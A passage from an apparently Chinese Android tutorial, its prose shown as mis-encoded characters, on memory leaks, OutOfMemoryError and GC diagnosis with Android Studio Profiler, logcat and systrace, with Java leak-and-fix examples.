    <span class="hljs-type">Cursor</span> <span class="hljs-variable">cursor</span> <span class="hljs-operator">=</span> db.query(<span class="hljs-string">"table"</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);
    <span class="hljs-comment">// ä½¿ç”¨cursor</span>
    <span class="hljs-comment">// å¿˜è®°å…³é—­cursorå’Œdbï¼Œå¯¼è‡´èµ„æºæ³„æ¼</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šåŠæ—¶å…³é—­</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">queryDatabase</span><span class="hljs-params">()</span> {
    <span class="hljs-type">SQLiteDatabase</span> <span class="hljs-variable">db</span> <span class="hljs-operator">=</span> getWritableDatabase();
    <span class="hljs-keyword">try</span> (<span class="hljs-type">Cursor</span> <span class="hljs-variable">cursor</span> <span class="hljs-operator">=</span> db.query(<span class="hljs-string">"table"</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)) {
        <span class="hljs-comment">// ä½¿ç”¨cursor</span>
        <span class="hljs-comment">// è‡ªåŠ¨å…³é—­cursor</span>
    } <span class="hljs-keyword">finally</span> {
        db.close();  <span class="hljs-comment">// å…³é—­æ•°æ®åº“è¿æ¥</span>
    }
}
</code></pre>
<p><strong>ç½‘ç»œè¿æ¥æœªå…³é—­ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šç½‘ç»œè¿æ¥æœªå…³é—­</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">downloadFile</span><span class="hljs-params">()</span> {
    <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();
    <span class="hljs-comment">// ä½¿ç”¨connection</span>
    <span class="hljs-comment">// å¿˜è®°å…³é—­ï¼Œå¯¼è‡´èµ„æºæ³„æ¼</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šåŠæ—¶å…³é—­</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">downloadFile</span><span class="hljs-params">()</span> {
    <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// ä½¿ç”¨connection</span>
    } <span class="hljs-keyword">finally</span> {
        connection.disconnect();  <span class="hljs-comment">// å…³é—­è¿æ¥</span>
    }
}
</code></pre>
<p><strong>Bitmapæœªé‡Šæ”¾ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šBitmapæœªé‡Šæ”¾</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadImage</span><span class="hljs-params">()</span> {
    <span class="hljs-type">Bitmap</span> <span class="hljs-variable">bitmap</span> <span class="hljs-operator">=</span> BitmapFactory.decodeFile(<span class="hljs-string">"image.jpg"</span>);
    imageView.setImageBitmap(bitmap);
    <span class="hljs-comment">// å¿˜è®°é‡Šæ”¾bitmapï¼Œå¯¼è‡´å†…å­˜æ³„æ¼</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šåŠæ—¶é‡Šæ”¾</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.onDestroy();
    <span class="hljs-keyword">if</span> (bitmap != <span class="hljs-literal">null</span> &amp;&amp; !bitmap.isRecycled()) {
        bitmap.recycle();  <span class="hljs-comment">// é‡Šæ”¾Bitmap</span>
        bitmap = <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<p><strong>AsyncTaskæ³„æ¼ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šAsyncTaskæŒæœ‰Activityå¼•ç”¨</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyAsyncTask</span>().execute();  <span class="hljs-comment">// AsyncTaskæŒæœ‰Activityå¼•ç”¨</span>
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAsyncTask</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AsyncTask</span>&lt;Void, Void, Void&gt; {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">protected</span> Void <span class="hljs-title function_">doInBackground</span><span class="hljs-params">(Void... params)</span> {
            <span class="hljs-comment">// é•¿æ—¶é—´è¿è¡Œ</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
    }
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨é™æ€å†…éƒ¨ç±»+å¼±å¼•ç”¨</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAsyncTask</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AsyncTask</span>&lt;Void, Void, Void&gt; {
    <span class="hljs-keyword">private</span> WeakReference&lt;Activity&gt; activityRef;
    
    MyAsyncTask(Activity activity) {
        activityRef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakReference</span>&lt;&gt;(activity);
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> Void <span class="hljs-title function_">doInBackground</span><span class="hljs-params">(Void... params)</span> {
        <span class="hljs-type">Activity</span> <span class="hljs-variable">activity</span> <span class="hljs-operator">=</span> activityRef.get();
        <span class="hljs-keyword">if</span> (activity != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// ä½¿ç”¨activity</span>
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<h4 data-id="heading-56">4.2.3 å¦‚ä½•é¿å…å†…å­˜æ³„æ¼</h4>
<p><strong>æ­£ç¡®å¤„ç†ç”Ÿå‘½å‘¨æœŸï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.onDestroy();
    <span class="hljs-comment">// æ¸…ç†èµ„æº</span>
    handler.removeCallbacksAndMessages(<span class="hljs-literal">null</span>);
    EventBus.getDefault().unregister(<span class="hljs-built_in">this</span>);
    cache.clear();
}
</code></pre>
<p><strong>ä½¿ç”¨å¼±å¼•ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¯¹äºå¯èƒ½æ³„æ¼çš„å¼•ç”¨ï¼Œä½¿ç”¨WeakReference</span>
<span class="hljs-keyword">private</span> WeakReference&lt;Activity&gt; activityRef;
</code></pre>
<p><strong>é¿å…å¾ªç¯å¼•ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ³¨æ„å¯¹è±¡ä¹‹é—´çš„ç›¸äº’å¼•ç”¨</span>
<span class="hljs-comment">// åŠæ—¶æ–­å¼€ä¸éœ€è¦çš„å¼•ç”¨</span>
</code></pre>
<p><strong>åˆç†ä½¿ç”¨ç¼“å­˜ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨æœ‰å¤§å°é™åˆ¶çš„ç¼“å­˜ï¼ˆLruCacheï¼‰</span>
<span class="hljs-keyword">private</span> LruCache&lt;String, Bitmap&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LruCache</span>&lt;&gt;(<span class="hljs-number">10</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);
</code></pre>
<h4 data-id="heading-57">4.3 å†…å­˜æº¢å‡ºï¼ˆOOM - OutOfMemoryErrorï¼‰</h4>
<h4 data-id="heading-58">4.3.1 ä»€ä¹ˆæ˜¯å†…å­˜æº¢å‡º</h4>
<p><strong>å®šä¹‰ï¼š</strong> åº”ç”¨éœ€è¦çš„å†…å­˜è¶…è¿‡äº†ç³»ç»Ÿåˆ†é…çš„é™åˆ¶ï¼Œæ— æ³•åˆ†é…æ–°å¯¹è±¡</p>
<p><strong>Androidå †å†…å­˜æº¢å‡ºï¼š</strong> æœ€å¸¸è§ï¼Œå †å†…å­˜ä¸è¶³</p>
<p><strong>å±å®³ï¼š</strong> åº”ç”¨å´©æºƒï¼Œç”¨æˆ·ä½“éªŒå·®</p>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OOMExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createTooManyObjects</span><span class="hljs-params">()</span> {
        List&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>());  <span class="hljs-comment">// æœ€ç»ˆå¯¼è‡´OOM</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-59">4.3.2 å†…å­˜æº¢å‡ºçš„åŸå› </h4>
<p><strong>å†…å­˜æ³„æ¼å¯¼è‡´ï¼š</strong></p>
<ul>
<li>å¯¹è±¡æ— æ³•å›æ”¶ï¼Œå†…å­˜é€æ¸è¢«å ç”¨</li>
<li>æœ€ç»ˆå¯¼è‡´å†…å­˜ä¸è¶³</li>
</ul>
<p><strong>åˆ›å»ºäº†å¤ªå¤šå¯¹è±¡ï¼š</strong></p>
<ul>
<li>ä¸€æ¬¡æ€§åŠ è½½å¤§é‡æ•°æ®</li>
<li>å¾ªç¯ä¸­åˆ›å»ºå¤§é‡å¯¹è±¡</li>
</ul>
<p><strong>å¤§å¯¹è±¡å ç”¨è¿‡å¤šå†…å­˜ï¼š</strong></p>
<ul>
<li>åŠ è½½è¿‡å¤§çš„å›¾ç‰‡</li>
<li>åˆ›å»ºè¿‡å¤§çš„æ•°ç»„</li>
</ul>
<p><strong>Androidè®¾å¤‡å†…å­˜é™åˆ¶ï¼š</strong></p>
<ul>
<li>ä¸åŒè®¾å¤‡æœ‰ä¸åŒçš„å †å†…å­˜ä¸Šé™</li>
<li>ä½ç«¯è®¾å¤‡å†…å­˜æ›´å°</li>
</ul>
<h4 data-id="heading-60">4.3.3 å¦‚ä½•è§£å†³å†…å­˜æº¢å‡º</h4>
<p><strong>æ’æŸ¥å†…å­˜æ³„æ¼ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨LeakCanaryæ£€æµ‹</li>
<li>ä½¿ç”¨MATåˆ†æå †è½¬å‚¨</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼é—®é¢˜</li>
</ul>
<p><strong>ä¼˜åŒ–å†…å­˜ä½¿ç”¨ï¼š</strong></p>
<ul>
<li>å‡å°‘å¯¹è±¡åˆ›å»º</li>
<li>åŠæ—¶é‡Šæ”¾ä¸éœ€è¦çš„å¯¹è±¡</li>
<li>ä½¿ç”¨å¯¹è±¡æ± å¤ç”¨å¯¹è±¡</li>
</ul>
<p><strong>å¤„ç†å¤§å¯¹è±¡ï¼š</strong></p>
<ul>
<li>å‹ç¼©å›¾ç‰‡å¤§å°</li>
<li>åˆ†æ‰¹åŠ è½½æ•°æ®</li>
<li>åŠæ—¶é‡Šæ”¾å¤§å¯¹è±¡</li>
</ul>
<p><strong>å¢åŠ å†…å­˜é™åˆ¶ï¼ˆæ²»æ ‡ä¸æ²»æœ¬ï¼‰ï¼š</strong></p>
<ul>
<li>åœ¨AndroidManifest.xmlä¸­è®¾ç½®largeHeap="true"</li>
<li>ä½†è¿™ä¸æ˜¯æ ¹æœ¬è§£å†³æ–¹æ¡ˆï¼Œè¿˜æ˜¯è¦ä¼˜åŒ–å†…å­˜ä½¿ç”¨</li>
</ul>
<hr/>
<h2 data-id="heading-61">ç¬¬äº”éƒ¨åˆ†ï¼šAndroid GCæ£€æµ‹ä¸è¯Šæ–­ï¼ˆå·¥å…·å’Œæ–¹æ³•ï¼‰</h2>
<h4 data-id="heading-62">5.1 Android GCæ£€æµ‹å·¥å…·å’Œæ–¹æ³•</h4>
<p><strong>è¯´æ˜ï¼šè¿™éƒ¨åˆ†éƒ½æ˜¯ç”¨æ¥æ£€æµ‹ã€åˆ†æã€è¯Šæ–­GCå’Œå†…å­˜é—®é¢˜çš„å·¥å…·å’Œæ–¹æ³•</strong></p>
<h4 data-id="heading-63">5.1.1 Android Studio Profilerï¼ˆæœ€å¸¸ç”¨çš„å·¥å…·ï¼‰</h4>
<p><strong>ä½œç”¨ï¼š</strong> å®æ—¶ç›‘æ§åº”ç”¨çš„å†…å­˜ã€CPUã€ç½‘ç»œç­‰æ€§èƒ½æ•°æ®</p>
<p><strong>Memory Profilerï¼ˆå†…å­˜åˆ†æå™¨ï¼‰åŠŸèƒ½ï¼š</strong></p>
<ol>
<li>
<p><strong>å®æ—¶æŸ¥çœ‹å†…å­˜ä½¿ç”¨æƒ…å†µ</strong></p>
<ul>
<li>æ˜¾ç¤ºå†…å­˜ä½¿ç”¨æ›²çº¿å›¾</li>
<li>å¯ä»¥çœ‹åˆ°å†…å­˜éšæ—¶é—´çš„å˜åŒ–è¶‹åŠ¿</li>
<li>è¯†åˆ«å†…å­˜æ³„æ¼ï¼ˆå†…å­˜æŒç»­å¢é•¿ï¼‰</li>
</ul>
</li>
<li>
<p><strong>æŸ¥çœ‹GCäº‹ä»¶</strong></p>
<ul>
<li>GCäº‹ä»¶ä¼šåœ¨å†…å­˜æ›²çº¿ä¸Šæ˜¾ç¤ºä¸ºå°å›¾æ ‡</li>
<li>ç‚¹å‡»GCäº‹ä»¶å¯ä»¥æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ï¼š
<ul>
<li>GCç±»å‹ï¼ˆPartial GCã€Full GCã€Sticky GCï¼‰</li>
<li>GCè€—æ—¶ï¼ˆæš‚åœæ—¶é—´ï¼‰</li>
<li>å›æ”¶å‰åçš„å†…å­˜å¤§å°</li>
<li>å›æ”¶äº†å¤šå°‘å†…å­˜</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>ç”Ÿæˆå †è½¬å‚¨ï¼ˆHeap Dumpï¼‰</strong></p>
<ul>
<li>ç‚¹å‡»"Heap Dump"æŒ‰é’®ç”Ÿæˆå †è½¬å‚¨</li>
<li>å¯ä»¥æŸ¥çœ‹å½“å‰æ‰€æœ‰å¯¹è±¡çš„å†…å­˜å ç”¨</li>
<li>å¯ä»¥å¯¼å‡ºä¸ºhprofæ–‡ä»¶ï¼Œç”¨MATåˆ†æ</li>
</ul>
</li>
<li>
<p><strong>æŸ¥çœ‹å¯¹è±¡åˆ†é…æƒ…å†µ</strong></p>
<ul>
<li>ä½¿ç”¨"Allocation Tracking"åŠŸèƒ½</li>
<li>è®°å½•ä¸€æ®µæ—¶é—´å†…çš„å¯¹è±¡åˆ†é…</li>
<li>å¯ä»¥çœ‹åˆ°å“ªäº›å¯¹è±¡è¢«åˆ†é…ï¼Œåœ¨å“ªé‡Œåˆ†é…ï¼ˆè°ƒç”¨æ ˆï¼‰</li>
</ul>
</li>
</ol>
<p><strong>CPU Profilerï¼ˆCPUåˆ†æå™¨ï¼‰åŠŸèƒ½ï¼š</strong></p>
<ul>
<li>æŸ¥çœ‹GCå ç”¨çš„CPUæ—¶é—´</li>
<li>åˆ†æGCå¯¹æ€§èƒ½çš„å½±å“</li>
<li>æŸ¥çœ‹GCçº¿ç¨‹çš„æ‰§è¡Œæƒ…å†µ</li>
</ul>
<p><strong>è¯¦ç»†ä½¿ç”¨æ­¥éª¤ï¼š</strong></p>
<ol>
<li>
<p><strong>æ‰“å¼€Profilerçª—å£</strong></p>
<ul>
<li>åœ¨Android Studioä¸­ï¼Œç‚¹å‡»åº•éƒ¨çš„"Profiler"æ ‡ç­¾</li>
<li>æˆ–é€šè¿‡èœå•ï¼šView â†’ Tool Windows â†’ Profiler</li>
</ul>
</li>
<li>
<p><strong>é€‰æ‹©è¦åˆ†æçš„åº”ç”¨è¿›ç¨‹</strong></p>
<ul>
<li>åœ¨Profilerçª—å£ä¸­é€‰æ‹©è¦åˆ†æçš„åº”ç”¨è¿›ç¨‹</li>
<li>ç¡®ä¿åº”ç”¨æ­£åœ¨è¿è¡Œï¼ˆdebugæ¨¡å¼ï¼‰</li>
</ul>
</li>
<li>
<p><strong>æŸ¥çœ‹å†…å­˜ä½¿ç”¨æƒ…å†µ</strong></p>
<ul>
<li>ç‚¹å‡»"Memory"æ ‡ç­¾</li>
<li>æŸ¥çœ‹å†…å­˜ä½¿ç”¨æ›²çº¿</li>
<li>è§‚å¯Ÿå†…å­˜æ˜¯å¦æŒç»­å¢é•¿ï¼ˆå¯èƒ½çš„å†…å­˜æ³„æ¼ï¼‰</li>
</ul>
</li>
<li>
<p><strong>æŸ¥çœ‹GCäº‹ä»¶</strong></p>
<ul>
<li>åœ¨å†…å­˜æ›²çº¿ä¸­ï¼ŒGCäº‹ä»¶ä¼šæ˜¾ç¤ºä¸ºå°å›¾æ ‡</li>
<li>ç‚¹å‡»GCäº‹ä»¶ï¼Œå¯ä»¥æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯</li>
<li>åˆ†æGCé¢‘ç‡å’Œè€—æ—¶</li>
</ul>
</li>
<li>
<p><strong>ç”Ÿæˆå †è½¬å‚¨</strong></p>
<ul>
<li>ç‚¹å‡»"Heap Dump"æŒ‰é’®</li>
<li>ç­‰å¾…ç”Ÿæˆå®Œæˆ</li>
<li>å¯ä»¥æŸ¥çœ‹å¯¹è±¡åˆ—è¡¨ã€å†…å­˜å ç”¨ç­‰</li>
<li>å¯ä»¥å¯¼å‡ºä¸ºhprofæ–‡ä»¶</li>
</ul>
</li>
<li>
<p><strong>æŸ¥çœ‹å¯¹è±¡åˆ†é…æƒ…å†µ</strong></p>
<ul>
<li>ç‚¹å‡»"Record allocations"æŒ‰é’®å¼€å§‹è®°å½•</li>
<li>æ“ä½œåº”ç”¨ï¼ˆæ¯”å¦‚æ»‘åŠ¨åˆ—è¡¨ï¼‰</li>
<li>ç‚¹å‡»"Stop recording"åœæ­¢è®°å½•</li>
<li>æŸ¥çœ‹å“ªäº›å¯¹è±¡è¢«åˆ†é…ï¼Œåœ¨å“ªé‡Œåˆ†é…</li>
</ul>
</li>
</ol>
<p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>æ—¥å¸¸å¼€å‘æ—¶ç›‘æ§å†…å­˜ä½¿ç”¨</li>
<li>åˆ†æå†…å­˜æ³„æ¼</li>
<li>åˆ†æGCæ€§èƒ½</li>
<li>ä¼˜åŒ–å†…å­˜ä½¿ç”¨</li>
</ul>
<h4 data-id="heading-64">5.1.2 logcatï¼ˆæŸ¥çœ‹GCæ—¥å¿—ï¼‰</h4>
<p><strong>ä½œç”¨ï¼š</strong> æŸ¥çœ‹GCçš„æ—¥å¿—ä¿¡æ¯ï¼Œäº†è§£GCçš„æ‰§è¡Œæƒ…å†µ</p>
<p><strong>GCæ—¥å¿—çš„ä½œç”¨ï¼š</strong></p>
<ul>
<li>äº†è§£GCä½•æ—¶è§¦å‘</li>
<li>äº†è§£GCçš„ç±»å‹å’Œè€—æ—¶</li>
<li>åˆ†æGCé¢‘ç‡æ˜¯å¦è¿‡é«˜</li>
<li>åˆ†æGCå¯¹æ€§èƒ½çš„å½±å“</li>
</ul>
<p><strong>å¦‚ä½•ä½¿ç”¨ï¼š</strong></p>
<p><strong>æ–¹æ³•1ï¼šä½¿ç”¨adb logcatï¼ˆå‘½ä»¤è¡Œï¼‰</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰GCæ—¥å¿—</span>
adb logcat | grep GC

<span class="hljs-comment"># æŸ¥çœ‹ç‰¹å®šåº”ç”¨çš„GCæ—¥å¿—</span>
adb logcat | grep -E <span class="hljs-string">"GC|dalvikvm|art"</span>
</code></pre>
<p><strong>æ–¹æ³•2ï¼šåœ¨Android Studioçš„Logcatçª—å£ä¸­æŸ¥çœ‹</strong></p>
<ul>
<li>æ‰“å¼€Logcatçª—å£ï¼ˆåº•éƒ¨æ ‡ç­¾ï¼‰</li>
<li>åœ¨è¿‡æ»¤æ¡†ä¸­è¾“å…¥"GC"æˆ–"dalvikvm"æˆ–"art"</li>
<li>æŸ¥çœ‹GCç›¸å…³çš„æ—¥å¿—</li>
</ul>
<p><strong>GCæ—¥å¿—æ ¼å¼ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-c" lang="c">GC: AllocSpace concurrent mark sweep freed 
    <span class="hljs-number">12345</span>(<span class="hljs-number">456</span>KB) AllocSpace bytes, 
    <span class="hljs-number">12</span>(<span class="hljs-number">234</span>KB) LOS objects, 
    <span class="hljs-number">50</span>% <span class="hljs-built_in">free</span>, <span class="hljs-number">5</span>MB/<span class="hljs-number">10</span>MB, 
    paused <span class="hljs-number">2.3</span>ms total <span class="hljs-number">15.6</span>ms
</code></pre>
<p><strong>GCæ—¥å¿—åŒ…å«çš„ä¿¡æ¯ï¼š</strong></p>
<ul>
<li><strong>GCç±»å‹</strong>ï¼šPartial GCã€Full GCã€Sticky GC</li>
<li><strong>GCè€—æ—¶</strong>ï¼špausedï¼ˆæš‚åœæ—¶é—´ï¼‰ã€totalï¼ˆæ€»è€—æ—¶ï¼‰</li>
<li><strong>å›æ”¶å‰åçš„å†…å­˜å¤§å°</strong>ï¼šfreedï¼ˆé‡Šæ”¾äº†å¤šå°‘å†…å­˜ï¼‰</li>
<li><strong>å†…å­˜ä½¿ç”¨æƒ…å†µ</strong>ï¼šfreeï¼ˆç©ºé—²å†…å­˜ï¼‰ã€totalï¼ˆæ€»å†…å­˜ï¼‰</li>
<li><strong>GCé¢‘ç‡</strong>ï¼šå¤šä¹…è§¦å‘ä¸€æ¬¡GC</li>
</ul>
<p><strong>å¦‚ä½•åˆ†æGCæ—¥å¿—ï¼š</strong></p>
<ol>
<li>
<p><strong>æŸ¥çœ‹GCé¢‘ç‡</strong></p>
<ul>
<li>ç»Ÿè®¡ä¸€æ®µæ—¶é—´å†…GCçš„æ¬¡æ•°</li>
<li>å¦‚æœGCè¿‡äºé¢‘ç¹ï¼ˆæ¯”å¦‚æ¯ç§’å¤šæ¬¡ï¼‰ï¼Œè¯´æ˜æœ‰é—®é¢˜</li>
<li>å¯èƒ½åŸå› ï¼šé¢‘ç¹åˆ›å»ºå¯¹è±¡ã€å†…å­˜æ³„æ¼</li>
</ul>
</li>
<li>
<p><strong>æŸ¥çœ‹GCè€—æ—¶</strong></p>
<ul>
<li>å…³æ³¨pausedæ—¶é—´ï¼ˆæš‚åœæ—¶é—´ï¼‰</li>
<li>å¦‚æœæš‚åœæ—¶é—´è¿‡é•¿ï¼ˆæ¯”å¦‚&gt;50msï¼‰ï¼Œä¼šå¯¼è‡´å¡é¡¿</li>
<li>Full GCçš„æš‚åœæ—¶é—´é€šå¸¸æ¯”Partial GCé•¿</li>
</ul>
</li>
<li>
<p><strong>æŸ¥çœ‹GCç±»å‹</strong></p>
<ul>
<li>Partial GCï¼šæ­£å¸¸ï¼Œå¿«é€Ÿ</li>
<li>Full GCï¼šéœ€è¦å…³æ³¨ï¼Œå¯èƒ½å¯¼è‡´å¡é¡¿</li>
<li>Sticky GCï¼šæ­£å¸¸ï¼Œå‡ ä¹æ„Ÿè§‰ä¸åˆ°</li>
</ul>
</li>
<li>
<p><strong>æŸ¥çœ‹å†…å­˜å›æ”¶æƒ…å†µ</strong></p>
<ul>
<li>freedï¼šé‡Šæ”¾äº†å¤šå°‘å†…å­˜</li>
<li>å¦‚æœé‡Šæ”¾çš„å†…å­˜å¾ˆå°‘ï¼Œè¯´æ˜å¤§éƒ¨åˆ†å¯¹è±¡è¿˜åœ¨ä½¿ç”¨</li>
<li>å¦‚æœé‡Šæ”¾çš„å†…å­˜å¾ˆå¤šï¼Œè¯´æ˜æœ‰å¾ˆå¤šåƒåœ¾å¯¹è±¡</li>
</ul>
</li>
</ol>
<p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>å¿«é€ŸæŸ¥çœ‹GCæƒ…å†µ</li>
<li>åˆ†æGCé¢‘ç‡å’Œè€—æ—¶</li>
<li>æ’æŸ¥GCå¯¼è‡´çš„æ€§èƒ½é—®é¢˜</li>
</ul>
<h4 data-id="heading-65">5.1.3 Systraceï¼ˆåˆ†æGCå¯¹æ€§èƒ½çš„å½±å“ï¼‰</h4>
<p><strong>ä½œç”¨ï¼š</strong> åˆ†æGCå¯¹æ€§èƒ½çš„å½±å“ï¼Œæ‰¾å‡ºGCå¯¼è‡´çš„å¡é¡¿é—®é¢˜</p>
<p><strong>Systraceæ˜¯ä»€ä¹ˆï¼š</strong></p>
<ul>
<li>Androidç³»ç»Ÿæä¾›çš„æ€§èƒ½åˆ†æå·¥å…·</li>
<li>å¯ä»¥è®°å½•ç³»ç»Ÿå„ä¸ªçº¿ç¨‹çš„æ‰§è¡Œæƒ…å†µ</li>
<li>å¯ä»¥çœ‹åˆ°GCåœ¨ä¸»çº¿ç¨‹ä¸Šçš„æ‰§è¡Œæ—¶é—´</li>
</ul>
<p><strong>å¦‚ä½•ä½¿ç”¨ï¼š</strong></p>
<p><strong>æ–¹æ³•1ï¼šä½¿ç”¨Android Studioçš„Systraceå·¥å…·</strong></p>
<ol>
<li>åœ¨Android Studioä¸­ï¼Œç‚¹å‡»"Tools" â†’ "Android" â†’ "Device Monitor"</li>
<li>é€‰æ‹©è¦åˆ†æçš„åº”ç”¨</li>
<li>ç‚¹å‡»"Systrace"æŒ‰é’®</li>
<li>è®¾ç½®è®°å½•æ—¶é—´ï¼ˆæ¯”å¦‚10ç§’ï¼‰</li>
<li>æ“ä½œåº”ç”¨ï¼ˆæ¯”å¦‚æ»‘åŠ¨åˆ—è¡¨ï¼‰</li>
<li>åœæ­¢è®°å½•ï¼ŒæŸ¥çœ‹ç»“æœ</li>
</ol>
<p><strong>æ–¹æ³•2ï¼šä½¿ç”¨å‘½ä»¤è¡Œå·¥å…·</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¼€å§‹è®°å½•</span>
python systrace.py -t 10 -o trace.html <span class="hljs-built_in">sched</span> freq idle am wm gfx view binder_driver hal dalvik camera input res

<span class="hljs-comment"># åœ¨è®¾å¤‡ä¸Šæ“ä½œåº”ç”¨</span>
<span class="hljs-comment"># åœæ­¢è®°å½•åï¼Œç”¨æµè§ˆå™¨æ‰“å¼€trace.htmlæŸ¥çœ‹</span>
</code></pre>
<p><strong>Systraceèƒ½åˆ†æä»€ä¹ˆï¼š</strong></p>
<ol>
<li>
<p><strong>GCæš‚åœæ—¶é—´</strong></p>
<ul>
<li>å¯ä»¥çœ‹åˆ°GCåœ¨ä¸»çº¿ç¨‹ä¸Šçš„æ‰§è¡Œæ—¶é—´</li>
<li>å¯ä»¥çœ‹åˆ°GCæš‚åœäº†å¤šä¹…</li>
<li>å¯ä»¥åˆ¤æ–­GCæ˜¯å¦å¯¼è‡´å¡é¡¿</li>
</ul>
</li>
<li>
<p><strong>GCå¯¹ä¸»çº¿ç¨‹çš„å½±å“</strong></p>
<ul>
<li>å¯ä»¥çœ‹åˆ°ä¸»çº¿ç¨‹åœ¨GCæœŸé—´è¢«é˜»å¡</li>
<li>å¯ä»¥çœ‹åˆ°GCå¯¼è‡´çš„å¸§ç‡ä¸‹é™</li>
<li>å¯ä»¥åˆ†æGCå¯¹ç”¨æˆ·ä½“éªŒçš„å½±å“</li>
</ul>
</li>
<li>
<p><strong>åº”ç”¨å¡é¡¿çš„åŸå› </strong></p>
<ul>
<li>å¯ä»¥çœ‹åˆ°å¡é¡¿æ˜¯å¦ç”±GCå¼•èµ·</li>
<li>å¯ä»¥çœ‹åˆ°GCå’Œå…¶ä»–æ“ä½œçš„æ—¶åºå…³ç³»</li>
<li>å¯ä»¥æ‰¾å‡ºæ€§èƒ½ç“¶é¢ˆ</li>
</ul>
</li>
</ol>
<p><strong>å¦‚ä½•æŸ¥çœ‹Systraceç»“æœï¼š</strong></p>
<ol>
<li>
<p><strong>æŸ¥çœ‹ä¸»çº¿ç¨‹</strong></p>
<ul>
<li>æ‰¾åˆ°"main"çº¿ç¨‹</li>
<li>æŸ¥çœ‹æ˜¯å¦æœ‰çº¢è‰²çš„å¸§ï¼ˆè¡¨ç¤ºæ‰å¸§ï¼‰</li>
<li>æŸ¥çœ‹æ˜¯å¦æœ‰GCäº‹ä»¶</li>
</ul>
</li>
<li>
<p><strong>æŸ¥çœ‹GCäº‹ä»¶</strong></p>
<ul>
